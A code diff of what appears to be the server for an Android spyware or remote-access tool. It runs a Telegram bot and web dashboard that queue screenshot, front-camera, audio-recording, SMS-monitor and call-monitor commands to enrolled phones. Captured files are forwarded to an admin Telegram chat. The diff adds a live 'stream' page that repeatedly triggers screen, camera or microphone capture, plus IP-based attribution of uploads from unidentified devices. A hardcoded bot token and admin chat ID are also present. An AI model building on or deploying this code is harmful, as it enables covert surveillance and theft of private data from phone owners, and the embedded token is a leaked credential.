@@ -27,7 +27,7 @@ from aiohttp import web
 # CONFIGURATION
 # ============================================================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8743374928:AAHDU0VyT83GJ_X-zQhqZSLONzjCIltLBOs")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8743374928:AAGShUT6RrMfSBQHA6NZsb1nw9xRqA6_9bw")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7344776596"))
 SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
 SERVER_DOMAIN = os.environ.get("SERVER_DOMAIN", "https://alsydyabwalzhra.online")
@@ -63,7 +63,7 @@ api_hits = 0
 tg_offset = 0
 _tg_session = None
 polling_active = False
-server_settings = {}
+# server_settings removed - use load_settings() directly
 _processed_update_ids = set()  # منع تكرار معالجة نفس التحديث
 _processed_message_keys = set()  # منع تكرار معالجة نفس الرسالة (chat_id:message_id)
 _last_message_time = {}  # منع إرسال رسائل مكررة (chat_id -> last_msg_time)
@@ -293,6 +293,24 @@ COMMAND_REGISTRY = {
 # ============================================================================
 # DATA HELPERS
 # ============================================================================
+
+# Module-level IP -> device_id mapping (for upload identification)
+_ip_device_map = {}
+# Module-level latest frame cache (accessible from upload handler at module level)
+_latest_frames_module = {}
+# Module-level JPEG stream task tracking
+_jpeg_stream_tasks_module = {}
+_jpeg_stream_info = {}
+
+def _get_real_ip(request):
+    """Extract real client IP from request, handling reverse proxy headers."""
+    forwarded = request.headers.get("X-Forwarded-For", "").strip()
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    real_ip = request.headers.get("X-Real-IP", "").strip()
+    if real_ip:
+        return real_ip
+    return request.remote or ""
 
 def ensure_data_dir():
     DATA_DIR.mkdir(parents=True, exist_ok=True)
@@ -641,13 +659,9 @@ async def firebase_update(path, data):
 
 def firebase_push_command(cmd):
     """Push command to Firebase so the Android app can receive it."""
-    import asyncio
     try:
-        loop = asyncio.get_event_loop()
-        if loop.is_running():
-            asyncio.ensure_future(_firebase_push_cmd_async(cmd))
-        else:
-            loop.run_until_complete(_firebase_push_cmd_async(cmd))
+        loop = asyncio.get_running_loop()
+        loop.create_task(_firebase_push_cmd_async(cmd))
     except RuntimeError:
         asyncio.run(_firebase_push_cmd_async(cmd))
 
@@ -1439,9 +1453,9 @@ async def handle_callback_query(callback):
             if remove_device(device_id):
                 text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
                 await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
+                await answer_callback_query(cb_id, "تم إلغاء الربط")
             else:
                 await answer_callback_query(cb_id, "فشل العملية", show_alert=True)
-            await answer_callback_query(cb_id)
             return
 
         # ── Device Selected ──
@@ -1471,26 +1485,7 @@ async def handle_callback_query(callback):
         for prefix, builder in submenu_map.items():
             if data.startswith(prefix + "_"):
                 device_id = data[len(prefix)+1:]
-                if prefix == "submenu_data":
-                    kb = build_data_submenu(device_id)
-                elif prefix == "submenu_social":
-                    kb = build_social_submenu(device_id)
-                elif prefix == "submenu_control":
-                    kb = build_control_submenu(device_id)
-                elif prefix == "submenu_apps":
-                    kb = build_apps_submenu(device_id)
-                elif prefix == "submenu_files":
-                    kb = build_files_submenu(device_id)
-                elif prefix == "submenu_security":
-                    kb = build_security_submenu(device_id)
-                elif prefix == "submenu_monitor":
-                    kb = build_monitor_submenu(device_id)
-                elif prefix == "submenu_syssettings":
-                    kb = build_syssettings_submenu(device_id)
-                elif prefix == "submenu_streaming":
-                    kb = build_streaming_submenu(device_id)
-                else:
-                    kb = build_back_button()
+                kb = builder(device_id)
                 cat_label = prefix.replace("submenu_", "").title()
                 await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
                 await answer_callback_query(cb_id)
@@ -1853,6 +1848,11 @@ async def api_get_commands(request):
     # Update last seen
     update_device(device_id, {"active": True})
     
+    # Track IP for upload identification
+    peer_ip = _get_real_ip(request)
+    if peer_ip and peer_ip != "127.0.0.1":
+        _ip_device_map[peer_ip] = device_id
+    
     return web.json_response({
         "ok": True,
         "commands": pending,
@@ -1965,7 +1965,11 @@ async def api_heartbeat(request):
                 "active": status_val == "online",
                 "battery": str(battery),
             })
-            log.info("Heartbeat from %s: battery=%d%% status=%s", device_id, battery, status_val)
+            # Track IP for upload identification
+            peer_ip = _get_real_ip(request)
+            if peer_ip and peer_ip != "127.0.0.1":
+                _ip_device_map[peer_ip] = device_id
+            log.info("Heartbeat from %s: battery=%d%% status=%s ip=%s", device_id, battery, status_val, peer_ip)
         
         return web.json_response({"ok": True, "success": True, "message": "Heartbeat received"})
     except Exception as exc:
@@ -2190,7 +2194,8 @@ async def api_device_settings(request):
 
 async def api_upload_file(request):
     """POST /api/upload - Receive files from device (photos, videos, audio, etc.).
-    يرسل الملفات مباشرة للبوت تليجرام."""
+    يرسل الملفات مباشرة للبوت تليجرام.
+    Also caches screenshot/camera images for the JPEG streaming viewer."""
     global api_hits
     api_hits += 1
     try:
@@ -2203,6 +2208,7 @@ async def api_upload_file(request):
         file_data = None
         file_name = None
         file_size = 0
+        upload_command = ""
         
         async for field in reader:
             if field.filename:
@@ -2218,27 +2224,61 @@ async def api_upload_file(request):
                     device_id = value_str
                 elif field.name == "file_type":
                     file_type = value_str
+                elif field.name == "command":
+                    upload_command = value_str
+                    # Use command as file_type hint if file_type not set
+                    if value_str in ("screenshot", "camera", "photo"):
+                        file_type = value_str
                 elif field.name == "command_id":
                     command_id = value_str
                 elif field.name == "caption":
                     caption = value_str
         
-        if not device_id:
-            return web.json_response({"ok": False, "error": "device_id required"}, status=400)
-        
         if not file_data:
             return web.json_response({"ok": False, "error": "No file received"}, status=400)
         
+        # If no device_id, try to identify by client IP
+        if not device_id:
+            peer_ip = _get_real_ip(request)
+            if peer_ip and peer_ip in _ip_device_map:
+                device_id = _ip_device_map[peer_ip]
+                log.info("Upload: identified device %s by IP %s", device_id, peer_ip)
+        
+        # Still no device_id - accept but can't attribute
+        if not device_id:
+            device_id = "unknown"
+            log.warning("Upload received without device_id and unknown IP %s", request.remote)
+        
         # Find or register device
         d = find_device(device_id)
-        if not d:
+        if not d and device_id != "unknown":
             device_data = {"id": device_id, "token": secrets.token_urlsafe(32), "active": True, "name": device_id, "model": "", "brand": "", "os": "", "battery": "", "network": "", "location": "", "last_seen": ts(), "created_at": ts(), "auto_registered": True}
             add_device(device_data)
             d = device_data
             log.info("Auto-registered device (upload): %s", device_id)
         
-        dev_name = d.get("name", device_id) if d else device_id
-        update_device(device_id, {"active": True})
+        dev_name = (d.get("name", device_id) if d else device_id) if device_id != "unknown" else "Unknown"
+        if device_id != "unknown":
+            update_device(device_id, {"active": True})
+        
+        # === CACHE IMAGE FOR STREAMING VIEWER ===
+        if file_type in ("screenshot", "camera", "photo") and device_id != "unknown" and len(file_data) > 1000:
+            try:
+                import base64 as b64mod
+                frame_b64 = b64mod.b64encode(file_data).decode('ascii')
+                frame_key = f"{device_id}:video"
+                _latest_frames_module[frame_key] = {
+                    "data": frame_b64,
+                    "timestamp": time.time(),
+                    "size": file_size,
+                    "source": file_type,
+                    "stream_id": device_id,
+                    "is_keyframe": True,
+                    "codec": "jpeg",
+                }
+                log.info("Cached %s frame for streaming: device=%s size=%d", file_type, device_id, file_size)
+            except Exception as cache_err:
+                log.error("Failed to cache frame: %s", cache_err)
         
         # Save file temporarily
         upload_dir = DATA_DIR / "uploads"
@@ -2251,30 +2291,26 @@ async def api_upload_file(request):
         log.info("File uploaded: %s (%d bytes) from device %s", file_name, file_size, device_id)
         append_event("File uploaded", {"device_id": device_id, "file": file_name, "type": file_type, "size": file_size})
         
-        # Send to Telegram based on file type
-        try:
-            if file_type in ("photo", "screenshot"):
-                # Send as photo
-                await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=f"📷 {file_type}\n📱 الجهاز: {dev_name}\n📁 {file_name}")
-            elif file_type == "video":
-                # Send as video
-                await tg_send_video(ADMIN_CHAT_ID, temp_path, caption=f"🎬 فيديو\n📱 الجهاز: {dev_name}\n📁 {file_name}")
-            elif file_type == "audio":
-                # Send as audio
-                await tg_send_audio(ADMIN_CHAT_ID, temp_path, caption=f"🎙️ صوت\n📱 الجهاز: {dev_name}\n📁 {file_name}")
-            else:
-                # Send as document
-                await tg_send_document(ADMIN_CHAT_ID, temp_path, caption=f"📄 ملف\n📱 الجهاز: {dev_name}\n📁 {file_name}")
-            
-            log.info("File sent to Telegram: %s", file_name)
-        except Exception as tg_err:
-            log.error("Failed to send file to Telegram: %s", tg_err)
-            # Still return success - file was saved
+        # Send to Telegram based on file type (skip if JPEG streaming to avoid spam)
+        is_stream_frame = file_type in ("screenshot", "camera", "photo") and _jpeg_stream_info.get(device_id, {}).get("active", False)
+        if not is_stream_frame:
+            try:
+                if file_type in ("photo", "screenshot", "camera"):
+                    await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=f"📷 {file_type}\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+                elif file_type == "video":
+                    await tg_send_video(ADMIN_CHAT_ID, temp_path, caption=f"🎬 فيديو\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+                elif file_type == "audio":
+                    await tg_send_audio(ADMIN_CHAT_ID, temp_path, caption=f"🎙️ صوت\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+                else:
+                    await tg_send_document(ADMIN_CHAT_ID, temp_path, caption=f"📄 ملف\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+                log.info("File sent to Telegram: %s", file_name)
+            except Exception as tg_err:
+                log.error("Failed to send file to Telegram: %s", tg_err)
         
         return web.json_response({
             "ok": True, 
             "success": True, 
-            "message": "File uploaded and sent to Telegram",
+            "message": "File uploaded successfully",
             "file_name": file_name,
             "file_size": file_size
         })
@@ -2703,6 +2739,29 @@ th{color:var(--text2);font-weight:500}
 .notification.show{transform:translateX(0)}
 .command-log .cmd-item{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface2)}
 .command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;margin-bottom:6px}
+.stream-layout{display:grid;grid-template-columns:320px 1fr;gap:16px;min-height:500px}
+@media(max-width:900px){.stream-layout{grid-template-columns:1fr;}}
+.stream-controls{display:flex;flex-direction:column;gap:12px}
+.stream-viewer{position:relative;background:#000;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}
+.stream-viewer video,.stream-viewer canvas,.stream-viewer img{width:100%;height:100%;object-fit:contain}
+.stream-viewer .no-stream{color:var(--text2);text-align:center;font-size:15px}
+.stream-viewer .stream-badge{position:absolute;top:12px;left:12px;background:rgba(230,57,70,.9);color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px}
+.stream-viewer .stream-badge.live::before{content:'';width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1s infinite}
+.stream-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.stream-type-btn{padding:14px 8px;border-radius:10px;border:2px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:center}
+.stream-type-btn:hover{border-color:var(--accent)}
+.stream-type-btn.active{border-color:var(--accent);background:rgba(230,57,70,.15)}
+.stream-type-btn .st-icon{font-size:28px;display:block;margin-bottom:4px}
+.stream-actions{display:flex;gap:8px;flex-wrap:wrap}
+.stream-actions .btn{flex:1;min-width:120px;justify-content:center;padding:12px}
+.stream-info{padding:12px;background:var(--surface2);border-radius:8px;font-size:12px;color:var(--text2)}
+.stream-info div{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)}
+.stream-info div:last-child{border:none}
+.stream-quality{display:flex;gap:6px;flex-wrap:wrap}
+.stream-quality button{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:12px;transition:all .2s}
+.stream-quality button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.audio-bars{display:flex;align-items:center;gap:3px;height:60px;padding:0 20px}
+.audio-bars .bar{width:4px;background:var(--accent);border-radius:2px;transition:height .1s}
 </style>
 </head>
 <body>
@@ -2727,6 +2786,7 @@ th{color:var(--text2);font-weight:500}
 <a onclick="showPage('commands')">🎮 Commands</a>
 <a onclick="showPage('files')">📂 Files</a>
 <a onclick="showPage('data')">📦 Data</a>
+<a onclick="showPage('streaming')">📡 Live Stream</a>
 <a onclick="showPage('monitor')">🔍 Monitor</a>
 <a onclick="showPage('settings')">⚙️ Settings</a>
 <a onclick="showPage('logs')">📝 Logs</a>
@@ -2806,6 +2866,77 @@ th{color:var(--text2);font-weight:500}
 <button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">📲 SMS Monitor</button>
 <button class="cmd-btn" onclick="sendMonCmd('call_monitor')">📞 Call Monitor</button>
 </div></div>
+</div>
+
+<div class="page" id="page-streaming">
+<div class="topbar"><h1>📡 البث المباشر</h1></div>
+<div class="stream-layout">
+<div class="stream-controls">
+<div class="card" style="margin-bottom:0">
+<h3>📱 اختر الجهاز</h3>
+<select id="streamDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px" onchange="onStreamDeviceChange()"></select>
+</div>
+<div class="card" style="margin-bottom:0">
+<h3>🎬 نوع البث</h3>
+<div class="stream-type-grid">
+<button class="stream-type-btn active" id="stScreen" onclick="selectStreamType('screen')">
+<span class="st-icon">🖥️</span>الشاشة
+</button>
+<button class="stream-type-btn" id="stCamera" onclick="selectStreamType('camera')">
+<span class="st-icon">📷</span>الكاميرا
+</button>
+<button class="stream-type-btn" id="stAudio" onclick="selectStreamType('audio')">
+<span class="st-icon">🎙️</span>الصوت
+</button>
+</div>
+</div>
+<div class="card" style="margin-bottom:0">
+<h3>⚙️ التحكم</h3>
+<div class="stream-actions">
+<button class="btn btn-primary" id="btnStartStream" onclick="startStream()">▶️ بدء البث</button>
+<button class="btn btn-danger" id="btnStopStream" onclick="stopStream()" style="display:none">⏹ إيقاف البث</button>
+<button class="btn btn-secondary" id="btnSwitchCam" onclick="switchCamera()" style="display:none">🔄 تبديل الكاميرا</button>
+</div>
+</div>
+<div class="card" style="margin-bottom:0" id="qualityCard">
+<h3>📊 الجودة</h3>
+<div class="stream-quality">
+<button class="active" onclick="setQuality('low',this)">SD</button>
+<button onclick="setQuality('medium',this)">HD</button>
+<button onclick="setQuality('high',this)">FHD</button>
+</div>
+</div>
+<div class="card" style="margin-bottom:0">
+<h3>ℹ️ حالة البث</h3>
+<div class="stream-info" id="streamInfoPanel">
+<div><span>الحالة</span><span id="stStatus">متوقف</span></div>
+<div><span>النوع</span><span id="stType">-</span></div>
+<div><span>الجهاز</span><span id="stDevice">-</span></div>
+<div><span>الإطارات</span><span id="stFrames">0</span></div>
+<div><span>آخر نشاط</span><span id="stLastAct">-</span></div>
+</div>
+</div>
+</div>
+<div>
+<div class="stream-viewer" id="streamViewer">
+<div class="no-stream" id="noStreamMsg">
+<div style="font-size:48px;margin-bottom:12px">📡</div>
+اختر جهازاً وابدأ البث المباشر
+</div>
+<img id="streamImg" style="display:none" alt="stream">
+<div class="stream-badge" id="streamBadge" style="display:none">LIVE</div>
+</div>
+<div id="audioPlayerContainer" style="display:none;margin-top:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
+<span style="font-size:20px">🎙️</span>
+<span style="font-weight:600">بث الصوت المباشر</span>
+<span class="badge badge-green" id="audioLiveBadge">LIVE</span>
+</div>
+<div class="audio-bars" id="audioBars"></div>
+<audio id="streamAudio" autoplay style="width:100%;margin-top:8px"></audio>
+</div>
+</div>
+</div>
 </div>
 
 <div class="page" id="page-settings">
@@ -3068,6 +3199,153 @@ if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
 if(TOKEN){showApp();}
 initCmdTabs();
 setTimeout(loadSettings,500);
+
+// ========== LIVE STREAMING (JPEG Screenshot-based) ==========
+let _streamType='screen';
+let _streamActive=false;
+let _streamPollTimer=null;
+let _frameCount=0;
+let _audioAnimFrame=null;
+let _streamWaitingTimer=null;
+let _firstFrameReceived=false;
+let _lastFrameData='';
+
+function populateStreamDeviceSelect(){
+const html=DEVICES.map(d=>'<option value="'+d.id+'">'+(d.name||d.id)+' ('+(d.active?'&#x1F7E2;':'&#x1F534;')+')</option>').join('');
+const el=document.getElementById('streamDevice');if(el)el.innerHTML=html;
+}
+const _origPopulate=populateDeviceSelects;
+populateDeviceSelects=function(){
+_origPopulate();populateStreamDeviceSelect();
+};
+
+function onStreamDeviceChange(){
+const devId=document.getElementById('streamDevice').value;
+document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
+if(_streamActive)stopStream();
+}
+
+function selectStreamType(type){
+_streamType=type;
+document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
+var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
+document.getElementById(btnId).classList.add('active');
+document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
+}
+
+function setQuality(q,btn){
+document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
+btn.classList.add('active');
+notify('تم تغيير الجودة');
+}
+
+function _setViewerState(state){
+var viewer=document.getElementById('streamViewer');
+var noMsg=document.getElementById('noStreamMsg');
+var img=document.getElementById('streamImg');
+var badge=document.getElementById('streamBadge');
+var audioC=document.getElementById('audioPlayerContainer');
+noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
+if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>اختر جهازاً وابدأ البث المباشر';viewer.style.background='var(--surface)';}
+else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">جاري انتظار الصورة من الجهاز...</div><div style="color:var(--text2);font-size:13px">يتم إرسال أمر لقطة الشاشة للجهاز.<br>قد يستغرق الأمر بضع ثوانٍ للإطار الأول.<br>تأكد أن الجهاز متصل بالإنترنت وأن إذن التقاط الشاشة ممنوحة.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">● انتظار...</span>';}
+else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">● متصل - ينتظر إطار...</span>';}
+else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
+else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
+else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">لم يتم استلام البث</div><div style="color:var(--text2);font-size:13px">تأكد أن الجهاز متصل ويمكنه تنفيذ أمر لقطة الشاشة.<br>تأكد من منح إذن التقاط الشاشة في تطبيق الجهاز.<br>حاول مرة أخرى.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">● فشل</span>';}
+}
+
+async function startStream(){
+var devId=document.getElementById('streamDevice').value;
+if(!devId){notify('اختر جهازاً أولاً','var(--accent)');return;}
+_streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
+document.getElementById('btnStartStream').style.display='none';
+document.getElementById('btnStopStream').style.display='';
+document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
+document.getElementById('stFrames').textContent='0';
+document.getElementById('stLastAct').textContent='-';
+var typeLabel=_streamType==='screen'?'الشاشة':_streamType==='camera'?'الكاميرا':'الصوت';
+document.getElementById('stType').textContent=typeLabel;
+var dev=DEVICES.find(function(d){return d.id===devId;});
+document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
+_setViewerState('waiting');
+notify('جاري بدء البث: '+typeLabel);
+var interval=_streamType==='audio'?5:3;
+var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
+if(!r.ok){notify('فشل بدء البث: '+(r.error||''),'var(--accent)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
+notify('تم بدء البث - بانتظار الإطار الأول...');
+startStreamPolling(devId);
+if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
+_streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
+}
+
+async function stopStream(){
+var devId=document.getElementById('streamDevice').value;
+if(!devId)return;
+api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+_cleanupStream();
+notify('تم إيقاف البث');
+}
+
+function _cleanupStream(){
+_streamActive=false;_firstFrameReceived=false;_lastFrameData='';
+if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
+if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
+if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
+document.getElementById('btnStartStream').style.display='';
+document.getElementById('btnStopStream').style.display='none';
+document.getElementById('btnSwitchCam').style.display='none';
+_setViewerState('idle');
+document.getElementById('stStatus').textContent='متوقف';
+}
+
+async function switchCamera(){
+var devId=document.getElementById('streamDevice').value;
+if(!devId)return;
+await api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+_streamType='camera';
+var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:'camera',interval:3})});
+if(r.ok){_streamActive=true;_firstFrameReceived=false;_setViewerState('waiting');startStreamPolling(devId);}
+notify('تم تبديل الكاميرا');
+}
+
+function _onFrameReceived(base64Data,isAudio){
+if(base64Data===_lastFrameData)return;
+_lastFrameData=base64Data;
+if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
+_frameCount++;
+document.getElementById('stFrames').textContent=_frameCount;
+document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
+if(isAudio){_setViewerState('receiving_audio');}
+else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
+}
+
+function startStreamPolling(devId){
+if(_streamPollTimer)clearInterval(_streamPollTimer);
+_streamPollTimer=setInterval(async function(){
+if(!_streamActive)return;
+try{
+var typeParam=_streamType==='audio'?'audio':'video';
+var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam);
+var r=await resp.json();
+if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
+else if(r.ok&&_firstFrameReceived){}
+else if(!_firstFrameReceived){
+try{var sr=await fetch('/api/stream/status');var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
+}
+}catch(e){}
+},2000);
+}
+
+// Add streaming category to commands
+if(typeof CMD_CATEGORIES!=='undefined'){
+CMD_CATEGORIES.streaming={label:'📡 Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
+if(document.getElementById('cmdTabs')){
+var tabs=document.getElementById('cmdTabs');
+if(tabs.innerHTML.indexOf('Streaming')===-1){
+tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">📡 Streaming</button>';
+}
+}
+}
 </script>
 </body>
 </html>"""
@@ -3317,6 +3595,31 @@ async def firebase_result_listener():
                     update_command_status(cmd_id, status, result_text)
                     update_device(device_id, {"active": True})
 
+                    # === CACHE SCREENSHOT/CAMERA IMAGES FOR STREAMING ===
+                    if command in ("screenshot", "front_camera", "back_camera") and status in ("completed", "success"):
+                        try:
+                            result_json = json.loads(str(result_text)) if isinstance(result_text, str) else result_text
+                            if isinstance(result_json, dict):
+                                b64_data = result_json.get("base64_preview", "")
+                                # Cache if we have substantial base64 data (full image, not truncated)
+                                if len(b64_data) > 1000 and "..." not in b64_data[-5:]:
+                                    frame_key = f"{device_id}:video"
+                                    _latest_frames_module[frame_key] = {
+                                        "data": b64_data,
+                                        "timestamp": time.time(),
+                                        "size": result_json.get("size", len(b64_data)),
+                                        "source": command,
+                                        "stream_id": device_id,
+                                        "is_keyframe": True,
+                                        "codec": "jpeg",
+                                    }
+                                    if device_id in _jpeg_stream_info:
+                                        _jpeg_stream_info[device_id]["last_frame_time"] = time.time()
+                                        _jpeg_stream_info[device_id]["frame_count"] = _jpeg_stream_info[device_id].get("frame_count", 0) + 1
+                                    log.info("Cached %s result image for streaming: device=%s b64_len=%d", command, device_id, len(b64_data))
+                        except Exception as cache_err:
+                            log.error("Failed to cache screenshot result: %s", cache_err)
+
                     # Delete the result from Firebase immediately
                     try:
                         await firebase_set(f"results/{device_id}/{cmd_id}", None)
@@ -3484,7 +3787,7 @@ def create_app():
             save_json(EVENTS_FILE, events)
 
             # Forward notification events to Telegram
-            if event_type == "notification" and settings.get("notifications", False):
+            if event_type == "notification" and load_settings().get("notifications", False):
                 title = data.get("title", "")
                 text = data.get("text", "")
                 pkg = data.get("package", "")
@@ -3537,8 +3840,10 @@ def create_app():
     _latest_frames = {}
     # Key: f"{device_id}:{stream_type}" -> {"audio_chunk": base64_str, "timestamp": float}
     _latest_audio = {}
+    # IP -> device_id mapping - use module-level _ip_device_map
+    # JPEG tasks use module-level _jpeg_stream_tasks_module
 
-    STREAMS_FILE = DATA_DIR / "stream_states.json"
+    # STREAMS_FILE removed (was unused)
 
     async def ws_stream(request):
         """WebSocket endpoint for streaming - /ws/stream?device_id=xxx&stream_id=xxx"""
@@ -3586,13 +3891,16 @@ def create_app():
                             _stream_connections[device_id]["last_activity"] = time.time()
 
                             # Forward to any dashboard viewer WebSockets
-                            viewer_key = f"viewer_{stream_id}"
+                            # Match by device_id OR exact stream_id for maximum compatibility
                             for vid, vinfo in list(_stream_connections.items()):
-                                if vid.startswith("viewer_") and vinfo.get("target_stream") == stream_id:
-                                    try:
-                                        await vinfo["ws"].send_str(msg.data)
-                                    except:
-                                        pass
+                                if vid.startswith("viewer_"):
+                                    target = vinfo.get("target_stream", "")
+                                    # Forward if viewer's target matches device_id OR stream_id
+                                    if target == device_id or target == stream_id:
+                                        try:
+                                            await vinfo["ws"].send_str(msg.data)
+                                        except:
+                                            pass
 
                         elif msg_type == "error":
                             log.warning("Stream error from %s: %s", device_id, data.get("error", ""))
@@ -3649,16 +3957,15 @@ def create_app():
                 elif msg.type == WSMsgType.TEXT:
                     try:
                         data = json.loads(msg.data)
-                        # Handle viewer commands (pause, resume, quality change, etc.)
                         cmd = data.get("type", "")
                         if cmd in ("stop_stream", "pause_stream", "resume_stream", "request_keyframe", "config_update"):
-                            # Forward to device
                             for did, dinfo in _stream_connections.items():
-                                if not did.startswith("viewer_") and dinfo.get("stream_id") == stream_id:
-                                    try:
-                                        await dinfo["ws"].send_str(msg.data)
-                                    except:
-                                        pass
+                                if not did.startswith("viewer_"):
+                                    if did == stream_id or dinfo.get("stream_id") == stream_id:
+                                        try:
+                                            await dinfo["ws"].send_str(msg.data)
+                                        except:
+                                            pass
                     except:
                         pass
         finally:
@@ -3673,8 +3980,11 @@ def create_app():
         frame_type = request.query.get("type", "video")
 
         frame_key = f"{device_id}:{frame_type}"
+        # Check both local (WebSocket streams) and module-level (JPEG uploads) caches
         store = _latest_frames if frame_type == "video" else _latest_audio
         entry = store.get(frame_key)
+        if not entry:
+            entry = _latest_frames_module.get(frame_key)
 
         if not entry:
             return web.json_response({"ok": False, "error": "No active stream"})
@@ -3689,10 +3999,138 @@ def create_app():
                 active[did] = {
                     "stream_id": dinfo.get("stream_id", ""),
                     "last_activity": dinfo.get("last_activity", 0),
-                    "has_video_frame": f"{did}:video" in _latest_frames,
+                    "has_video_frame": f"{did}:video" in _latest_frames or f"{did}:video" in _latest_frames_module,
                     "has_audio_chunk": f"{did}:audio" in _latest_audio,
                 }
+        # Also report JPEG screenshot streams
+        for did, info in _jpeg_stream_info.items():
+            if info.get("active"):
+                active[did] = {
+                    "stream_id": did,
+                    "last_activity": info.get("last_frame_time", 0),
+                    "has_video_frame": f"{did}:video" in _latest_frames_module,
+                    "has_audio_chunk": False,
+                    "jpeg_stream": True,
+                }
         return web.json_response({"ok": True, "active_streams": active, "total": len(active)})
+
+    async def _jpeg_stream_loop(device_id, stream_type, interval):
+        """Background task that queues screenshot/camera commands at regular intervals."""
+        import asyncio
+        cmd_map = {
+            "screen": "screenshot",
+            "camera": "front_camera",
+            "audio": "record_audio",
+        }
+        cmd = cmd_map.get(stream_type, "screenshot")
+        log.info("JPEG stream loop started: device=%s type=%s cmd=%s interval=%ds", device_id, stream_type, cmd, interval)
+        try:
+            while device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
+                # Queue the capture command
+                queue_command(device_id, cmd)
+                _jpeg_stream_info[device_id]["last_command_time"] = time.time()
+                log.debug("JPEG stream: queued '%s' for %s", cmd, device_id)
+                # Wait for interval (check every second so we can stop promptly)
+                for _ in range(interval):
